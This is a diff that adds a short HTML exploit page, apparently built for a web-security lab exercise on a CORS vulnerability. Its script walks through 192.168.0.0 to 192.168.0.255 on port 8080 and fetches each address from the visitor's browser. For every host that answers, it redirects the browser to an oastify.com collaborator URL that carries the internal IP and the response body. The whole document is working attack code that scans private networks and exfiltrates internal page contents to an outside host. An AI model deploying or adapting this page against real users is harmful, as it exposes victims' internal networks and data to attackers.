@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+
+<body>
+    <script>
+        var collaboratorURL = "http://g4lydjhoisr6wmda2wm5gqgen5twhr5g.oastify.com";
+        // Base On CORS Vulnerability
+
+        for ( let i = 0; i < 256; i++) {
+            var ipAddress = "http://192.168.0." + i + ":8080";
+
+            fetch(ipAddress)
+                .then(response => response.text())
+                .then(text => {
+
+                    location = collaboratorURL + "?ip=192.168.0." + i + "&code=" + encodeURIComponent(text)
+
+        
+                })
+        }
+    </script>
+</body>
+</html>
